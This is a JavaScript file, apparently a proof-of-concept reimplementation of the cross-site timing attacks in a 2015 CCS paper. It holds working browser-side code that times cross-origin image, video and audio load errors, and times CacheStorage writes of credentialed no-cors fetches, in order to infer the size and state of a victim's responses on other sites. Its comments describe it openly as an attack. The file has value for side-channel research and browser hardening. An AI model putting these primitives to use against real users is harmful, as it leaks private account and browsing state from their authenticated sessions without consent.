
const measurers = [{ fn: getImageMeasurement, name: 'Image' }, { fn: getVideoMeasurement, name: 'Video' }, { fn: getAudioMeasurement, name: 'Audio' }, { fn: getCacheStorageMeasurement, name: 'CacheStorage' }];
let measureMethod = 1;

function changeMethod(e) {
    for (let i = 0; i < measurers.length; i++) {
        if (measurers[i].name == e.value) {
            measureMethod = i;
            console.log('updated to ', e.value);
        }
    }
}

// Measurement code from https://tom.vg/papers/timing-attacks_ccs2015.pdf
// The most straightforward way to perform a cross-site timing attack is to attempt to load an external resource that
// leaks information on the state of the victim as an image,
// and measure the time required to download the resource.
function getImageMeasurement(url, callback) {
    var i = new Image();
    i.addEventListener('error', function () {
        var end = performance.now();
        callback(end - start);
    });
    var start = performance.now();
    i.src = url;
}

function getVideoMeasurement(url, callback) {
    var v = document.createElement('video');
    var start = null;
    v.addEventListener('suspend', function () {
        start = performance.now();
        // console.log("start ", start);
    });
    v.addEventListener('error', function () {
        var end = performance.now();
        // console.log("end ", end);
        if (start === null) {
            throw "video suspend never hit"
        }
        callback(end - start);
    });
    v.src = url;
}

function getAudioMeasurement(url, callback) {
    var v = document.createElement('audio');
    var start = null;
    v.addEventListener('suspend', function () {
        start = performance.now();
        // console.log("start ", start);
    });
    v.addEventListener('error', function () {
        var end = performance.now();
        // console.log("end ", end);
        if (start === null) {
            throw "audio suspend never hit"
        }
        callback(end - start);
    });
    v.src = url;
}

// If you are not familiar with the Fetch API or Promises, this may look a bit more complicated, but in fact it is simply placing a Response into the cache. What’s important to note is that on the second line, I passed following options to fetch(): {mode: "no-cors", credentials: "include"}. Basically, this makes sure that the fetch algorithm does not use the Cross-Origin Resource Sharing (CORS) mechanism, and include the cookies with the request (which is important, because we want the response to be specific to the user). Also, because the Promise returned by fetch() resolves as soon as the first byte of the response is received (and not when the complete response is in), I used the very naive setTimeout method to wait for the response to be downloaded. This can be easily improved by first having a round of cache.put() and cache.delete(). Anyways, the take-away message is that we can measure the storage time, and use that to infer the length of the response.
function getCacheStorageMeasurement(url, callback) {
    // measureResponseTime();
    fetch(url, { mode: "no-cors", credentials: "include" }).then(function (resp) {
        setTimeout(function () {
            caches.open('attackz0r').then(function (cache) {
                var start = performance.now();
                cache.put(new Request('foo'), resp.clone()).then(function () {
                    var end = performance.now();
                    callback(end - start);
                });
            });
        }, 3000);
    });
}